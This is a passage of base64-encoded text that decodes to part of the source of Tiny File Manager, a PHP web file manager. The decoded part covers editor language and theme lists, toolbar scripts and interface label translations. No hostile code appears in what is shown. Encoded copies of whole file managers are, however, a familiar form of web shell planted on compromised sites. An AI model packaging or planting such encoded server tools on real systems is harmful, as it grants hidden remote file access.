JvbCI6ICJDb2JvbCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjb2ZmZWUiOiAiQ29mZmVlU2NyaXB0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNvbGRmdXNpb24iOiAiQ29sZEZ1c2lvbiIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjc2hhcnAiOiAiQyMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY3NvdW5kX2RvY3VtZW50IjogIkNzb3VuZCBEb2N1bWVudCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjc291bmRfb3JjaGVzdHJhIjogIkNzb3VuZCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjc291bmRfc2NvcmUiOiAiQ3NvdW5kIFNjb3JlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNzcyI6ICJDU1MiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY3VybHkiOiAiQ3VybHkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZCI6ICJEIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRhcnQiOiAiRGFydCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkaWZmIjogIkRpZmYiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZG9ja2VyZmlsZSI6ICJEb2NrZXJmaWxlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRvdCI6ICJEb3QiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZHJvb2xzIjogIkRyb29scyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJlZGlmYWN0IjogIkVkaWZhY3QiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZWlmZmVsIjogIkVpZmZlbCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJlanMiOiAiRUpTIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImVsaXhpciI6ICJFbGl4aXIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZWxtIjogIkVsbSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJlcmxhbmciOiAiRXJsYW5nIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImZvcnRoIjogIkZvcnRoIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImZvcnRyYW4iOiAiRm9ydHJhbiIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJmc2hhcnAiOiAiRlNoYXJwIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImZzbCI6ICJGU0wiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZnRsIjogIkZyZWVNYXJrZXIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZ2NvZGUiOiAiR2NvZGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZ2hlcmtpbiI6ICJHaGVya2luIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImdpdGlnbm9yZSI6ICJHaXRpZ25vcmUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZ2xzbCI6ICJHbHNsIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImdvYnN0b25lcyI6ICJHb2JzdG9uZXMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZ29sYW5nIjogIkdvIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImdyYXBocWxzY2hlbWEiOiAiR3JhcGhRTFNjaGVtYSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJncm9vdnkiOiAiR3Jvb3Z5IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImhhbWwiOiAiSEFNTCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJoYW5kbGViYXJzIjogIkhhbmRsZWJhcnMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaGFza2VsbCI6ICJIYXNrZWxsIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImhhc2tlbGxfY2FiYWwiOiAiSGFza2VsbCBDYWJhbCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJoYXhlIjogImhhWGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaGpzb24iOiAiSGpzb24iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaHRtbCI6ICJIVE1MIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImh0bWxfZWxpeGlyIjogIkhUTUwgKEVsaXhpcikiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaHRtbF9ydWJ5IjogIkhUTUwgKFJ1YnkpIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImluaSI6ICJJTkkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaW8iOiAiSW8iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiamFjayI6ICJKYWNrIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImphZGUiOiAiSmFkZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJqYXZhIjogIkphdmEiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAianNvbiI6ICJKU09OIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImpzb25pcSI6ICJKU09OaXEiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAianNwIjogIkpTUCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJqc3NtIjogIkpTU00iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAianN4IjogIkpTWCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJqdWxpYSI6ICJKdWxpYSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJrb3RsaW4iOiAiS290bGluIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImxhdGV4IjogIkxhVGVYIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImxlc3MiOiAiTEVTUyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJsaXF1aWQiOiAiTGlxdWlkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImxpc3AiOiAiTGlzcCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJsaXZlc2NyaXB0IjogIkxpdmVTY3JpcHQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibG9naXFsIjogIkxvZ2lRTCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJsc2wiOiAiTFNMIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImx1YSI6ICJMdWEiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibHVhcGFnZSI6ICJMdWFQYWdlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImx1Y2VuZSI6ICJMdWNlbmUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWFrZWZpbGUiOiAiTWFrZWZpbGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWFya2Rvd24iOiAiTWFya2Rvd24iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWFzayI6ICJNYXNrIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1hdGxhYiI6ICJNQVRMQUIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWF6ZSI6ICJNYXplIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1lbCI6ICJNRUwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWl4YWwiOiAiTUlYQUwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibXVzaGNvZGUiOiAiTVVTSENvZGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibXlzcWwiOiAiTXlTUUwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibml4IjogIk5peCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJuc2lzIjogIk5TSVMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAib2JqZWN0aXZlYyI6ICJPYmplY3RpdmUtQyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJvY2FtbCI6ICJPQ2FtbCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwYXNjYWwiOiAiUGFzY2FsIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBlcmwiOiAiUGVybCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwZXJsNiI6ICJQZXJsIDYiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGdzcWwiOiAicGdTUUwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGhwX2xhcmF2ZWxfYmxhZGUiOiAiUEhQIChCbGFkZSBUZW1wbGF0ZSkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGhwIjogIlBIUCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwdXBwZXQiOiAiUHVwcGV0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBpZyI6ICJQaWciLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicG93ZXJzaGVsbCI6ICJQb3dlcnNoZWxsIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInByYWF0IjogIlByYWF0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInByb2xvZyI6ICJQcm9sb2ciLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicHJvcGVydGllcyI6ICJQcm9wZXJ0aWVzIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInByb3RvYnVmIjogIlByb3RvYnVmIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInB5dGhvbiI6ICJQeXRob24iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiciI6ICJSIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInJhem9yIjogIlJhem9yIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInJkb2MiOiAiUkRvYyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJyZWQiOiAiUmVkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInJodG1sIjogIlJIVE1MIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInJzdCI6ICJSU1QiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicnVieSI6ICJSdWJ5IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInJ1c3QiOiAiUnVzdCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzYXNzIjogIlNBU1MiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2NhZCI6ICJTQ0FEIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNjYWxhIjogIlNjYWxhIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNjaGVtZSI6ICJTY2hlbWUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2NzcyI6ICJTQ1NTIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNoIjogIlNIIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNqcyI6ICJTSlMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2xpbSI6ICJTbGltIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNtYXJ0eSI6ICJTbWFydHkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic25pcHBldHMiOiAic25pcHBldHMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic295X3RlbXBsYXRlIjogIlNveSBUZW1wbGF0ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzcGFjZSI6ICJTcGFjZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzcWwiOiAiU1FMIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNxbHNlcnZlciI6ICJTUUxTZXJ2ZXIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic3R5bHVzIjogIlN0eWx1cyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzdmciOiAiU1ZHIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInN3aWZ0IjogIlN3aWZ0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInRjbCI6ICJUY2wiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidGVycmFmb3JtIjogIlRlcnJhZm9ybSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXgiOiAiVGV4IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiVGV4dCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0aWxlIjogIlRleHRpbGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidG9tbCI6ICJUb21sIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInRzeCI6ICJUU1giLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidHdpZyI6ICJUd2lnIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInR5cGVzY3JpcHQiOiAiVHlwZXNjcmlwdCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ2YWxhIjogIlZhbGEiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidmJzY3JpcHQiOiAiVkJTY3JpcHQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidmVsb2NpdHkiOiAiVmVsb2NpdHkiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidmVyaWxvZyI6ICJWZXJpbG9nIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInZoZGwiOiAiVkhETCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ2aXN1YWxmb3JjZSI6ICJWaXN1YWxmb3JjZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ3b2xsb2siOiAiV29sbG9rIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInhtbCI6ICJYTUwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAieHF1ZXJ5IjogIlhRdWVyeSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ5YW1sIjogIllBTUwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGphbmdvIjogIkRqYW5nbyINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJmb250U2l6ZSI6IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgODogOCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTA6IDEwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxMTogMTEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDEyOiAxMiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTM6IDEzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxNDogMTQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE1OiAxNSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMTY6IDE2LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAxNzogMTcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDE4OiAxOCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMjA6IDIwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAyMjogMjIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDI0OiAyNCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMjY6IDI2LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAzMDogMzANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICBpZiAoX2RhdGEgJiYgX2RhdGEuYWNlTW9kZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1vZGVFbC5odG1sKG9wdGlvbk5vZGUoImFjZS9tb2RlLyIsIF9kYXRhLmFjZU1vZGUpKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoX2RhdGEgJiYgX2RhdGEuYWNlVGhlbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBsaWdodFRoZW1lID0gb3B0aW9uTm9kZSgiYWNlL3RoZW1lLyIsIF9kYXRhLmFjZVRoZW1lLmJyaWdodCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGFya1RoZW1lID0gb3B0aW9uTm9kZSgiYWNlL3RoZW1lLyIsIF9kYXRhLmFjZVRoZW1lLmRhcmspOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoZW1lRWwuaHRtbCgiPG9wdGdyb3VwIGxhYmVsPVwiQnJpZ2h0XCI+IiArIGxpZ2h0VGhlbWUgKyAiPC9vcHRncm91cD48b3B0Z3JvdXAgbGFiZWw9XCJEYXJrXCI+IiArIGRhcmtUaGVtZSArICI8L29wdGdyb3VwPiIpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmIChfZGF0YSAmJiBfZGF0YS5mb250U2l6ZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGZvbnRTaXplRWwuaHRtbChvcHRpb25Ob2RlKCIiLCBfZGF0YS5mb250U2l6ZSkpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRtb2RlRWwudmFsKGVkaXRvci5nZXRTZXNzaW9uKCkuJG1vZGVJZCk7DQogICAgICAgICAgICAgICAgICAgICR0aGVtZUVsLnZhbChlZGl0b3IuZ2V0VGhlbWUoKSk7DQogICAgICAgICAgICAgICAgICAgICQoZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAvL3NldCBkZWZhdWx0IGZvbnQgc2l6ZSBpbiBkcm9wIGRvd24NCiAgICAgICAgICAgICAgICAgICAgICAgICRmb250U2l6ZUVsLnZhbCgxMikuY2hhbmdlKCk7DQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICQoZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIHJlbmRlclRoZW1lTW9kZSgpOw0KICAgICAgICAgICAgICAgICAgICAkKCIuanMtYWNlLXRvb2xiYXIiKS5vbigiY2xpY2siLCAnYnV0dG9uJywgZnVuY3Rpb24oZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGNtZFZhbHVlID0gJCh0aGlzKS5hdHRyKCJkYXRhLWNtZCIpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVkaXRvck9wdGlvbiA9ICQodGhpcykuYXR0cigiZGF0YS1vcHRpb24iKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjbWRWYWx1ZSAmJiBjbWRWYWx1ZSAhPSAibm9uZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY2VfY29tbWVuZChjbWRWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGVkaXRvck9wdGlvbikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlZGl0b3JPcHRpb24gPT0gImZ1bGxzY3JlZW4iKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICh2b2lkIDAgIT09IGRvY3VtZW50LmZ1bGxTY3JlZW5FbGVtZW50ICYmIG51bGwgPT09IGRvY3VtZW50LmZ1bGxTY3JlZW5FbGVtZW50IHx8IHZvaWQgMCAhPT0gZG9jdW1lbnQubXNGdWxsc2NyZWVuRWxlbWVudCAmJiBudWxsID09PSBkb2N1bWVudC5tc0Z1bGxzY3JlZW5FbGVtZW50IHx8IHZvaWQgMCAhPT0gZG9jdW1lbnQubW96RnVsbFNjcmVlbiAmJiAhZG9jdW1lbnQubW96RnVsbFNjcmVlbiB8fCB2b2lkIDAgIT09IGRvY3VtZW50LndlYmtpdElzRnVsbFNjcmVlbiAmJiAhZG9jdW1lbnQud2Via2l0SXNGdWxsU2NyZWVuKSAmJg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoZWRpdG9yLmNvbnRhaW5lci5yZXF1ZXN0RnVsbFNjcmVlbiA/IGVkaXRvci5jb250YWluZXIucmVxdWVzdEZ1bGxTY3JlZW4oKSA6IGVkaXRvci5jb250YWluZXIubW96UmVxdWVzdEZ1bGxTY3JlZW4gPyBlZGl0b3IuY29udGFpbmVyLm1velJlcXVlc3RGdWxsU2NyZWVuKCkgOiBlZGl0b3IuY29udGFpbmVyLndlYmtpdFJlcXVlc3RGdWxsU2NyZWVuID8gZWRpdG9yLmNvbnRhaW5lci53ZWJraXRSZXF1ZXN0RnVsbFNjcmVlbihFbGVtZW50LkFMTE9XX0tFWUJPQVJEX0lOUFVUKSA6IGVkaXRvci5jb250YWluZXIubXNSZXF1ZXN0RnVsbHNjcmVlbiAmJiBlZGl0b3IuY29udGFpbmVyLm1zUmVxdWVzdEZ1bGxzY3JlZW4oKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChlZGl0b3JPcHRpb24gPT0gIndyYXAiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCB3cmFwU3RhdHVzID0gKGVkaXRvci5nZXRTZXNzaW9uKCkuZ2V0VXNlV3JhcE1vZGUoKSkgPyBmYWxzZSA6IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0VXNlV3JhcE1vZGUod3JhcFN0YXR1cyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9KTsNCg0KICAgICAgICAgICAgICAgICAgICAkKCJzZWxlY3QjanMtYWNlLW1vZGUsIHNlbGVjdCNqcy1hY2UtdGhlbWUsIHNlbGVjdCNqcy1hY2UtZm9udFNpemUiKS5vbigiY2hhbmdlIiwgZnVuY3Rpb24oZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHNlbGVjdGVkVmFsdWUgPSAkKHRoaXMpLnZhbCgpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdGlvblR5cGUgPSAkKHRoaXMpLmF0dHIoImRhdGEtdHlwZSIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNlbGVjdGVkVmFsdWUgJiYgc2VsZWN0aW9uVHlwZSA9PSAibW9kZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlZGl0b3IuZ2V0U2Vzc2lvbigpLnNldE1vZGUoc2VsZWN0ZWRWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHNlbGVjdGVkVmFsdWUgJiYgc2VsZWN0aW9uVHlwZSA9PSAidGhlbWUiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWRpdG9yLnNldFRoZW1lKHNlbGVjdGVkVmFsdWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChzZWxlY3RlZFZhbHVlICYmIHNlbGVjdGlvblR5cGUgPT0gImZvbnRTaXplIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVkaXRvci5zZXRGb250U2l6ZShwYXJzZUludChzZWxlY3RlZFZhbHVlKSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgPC9zY3JpcHQ+DQogICAgICAgIDw/cGhwIGVuZGlmOyA/Pg0KICAgICAgICA8ZGl2IGlkPSJzbmFja2JhciI+PC9kaXY+DQogICAgPC9ib2R5Pg0KDQogICAgPC9odG1sPg0KPD9waHANCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBMYW5ndWFnZSBUcmFuc2xhdGlvbiBTeXN0ZW0NCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eHQNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIGZ1bmN0aW9uIGxuZygkdHh0KQ0KICAgIHsNCiAgICAgICAgZ2xvYmFsICRsYW5nOw0KDQogICAgICAgIC8vIEVuZ2xpc2ggTGFuZ3VhZ2UNCiAgICAgICAgJHRyWydlbiddWydBcHBOYW1lJ10gICAgICAgID0gJ1RpbnkgRmlsZSBNYW5hZ2VyJzsNCiAgICAgICAgJHRyWydlbiddWydBcHBUaXRsZSddICAgICAgID0gJ0ZpbGUgTWFuYWdlcic7DQogICAgICAgICR0clsnZW4nXVsnTG9naW4nXSAgICAgICAgICA9ICdTaWduIGluJzsNCiAgICAgICAgJHRyWydlbiddWydVc2VybmFtZSddICAgICAgID0gJ1VzZXJuYW1lJzsNCiAgICAgICAgJHRyWydlbiddWydQYXNzd29yZCddICAgICAgID0gJ1Bhc3N3b3JkJzsNCiAgICAgICAgJHRyWydlbiddWydMb2dvdXQnXSAgICAgICAgID0gJ1NpZ24gT3V0JzsNCiAgICAgICAgJHRyWydlbiddWydNb3ZlJ10gICAgICAgICAgID0gJ01vdmUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0NvcHknXSAgICAgICAgICAgPSAnQ29weSc7DQogICAgICAgICR0clsnZW4nXVsnU2F2ZSddICAgICAgICAgICA9ICdTYXZlJzsNCiAgICAgICAgJHRyWydlbiddWydTZWxlY3RBbGwnXSAgICAgID0gJ1NlbGVjdCBhbGwnOw0KICAgICAgICAkdHJbJ2VuJ11bJ1VuU2VsZWN0QWxsJ10gICAgPSAnVW5zZWxlY3QgYWxsJzsNCiAgICAgICAgJHRyWydlbiddWydGaWxlJ10gICAgICAgICAgID0gJ0ZpbGUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0JhY2snXSAgICAgICAgICAgPSAnQmFjayc7DQogICAgICAgICR0clsnZW4nXVsnU2l6ZSddICAgICAgICAgICA9ICdTaXplJzsNCiAgICAgICAgJHRyWydlbiddWydQZXJtcyddICAgICAgICAgID0gJ1Blcm1zJzsNCiAgICAgICAgJHRyWydlbiddWydNb2RpZmllZCddICAgICAgID0gJ01vZGlmaWVkJzsNCiAgICAgICAgJHRyWydlbiddWydPd25lciddICAgICAgICAgID0gJ093bmVyJzsNCiAgICAgICAgJHRyWydlbiddWydTZWFyY2gnXSAgICAgICAgID0gJ1NlYXJjaCc7DQogICAgICAgICR0clsnZW4nXVsnTmV3SXRlbSddICAgICAgICA9ICdOZXcgSXRlbSc7DQogICAgICAgICR0clsnZW4nXVsnRm9sZGVyJ10gICAgICAgICA9ICdGb2xkZXInOw0KICAgICAgICAkdHJbJ2VuJ11bJ0RlbGV0ZSddICAgICAgICAgPSAnRGVsZXRlJzsNCiAgICAgICAgJHRyWydlbiddWydSZW5hbWUnXSAgICAgICAgID0gJ1JlbmFtZSc7DQogICAgICAgICR0clsnZW4nXVsnQ29weVRvJ10gICAgICAgICA9ICdDb3B5IHRvJzsNCiAgICAgICAgJHRyWydlbiddWydEaXJlY3RMaW5rJ10gICAgID0gJ0RpcmVjdCBsaW5rJzsNCiAgICAgICAgJHRyWydlbiddWydVcGxvYWRpbmdGaWxlcyddID0gJ1VwbG9hZCBGaWxlcyc7DQogICAgICAgICR0clsnZW4nXVsnQ2hhbmdlUGVybWlzc2lvbnMnXSAgPSAnQ2hhbmdlIFBlcm1pc3Npb25zJzsNCiAgICAgICAgJHRyWydlbiddWydDb3B5aW5nJ10gICAgICAgID0gJ0NvcHlpbmcnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0NyZWF0ZU5ld0l0ZW0nXSAgPSAnQ3JlYXRlIE5ldyBJdGVtJzsNCiAgICAgICAgJHRyWydlbiddWydOYW1lJ10gICAgICAgICAgID0gJ05hbWUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0FkdmFuY2VkRWRpdG9yJ10gPSAn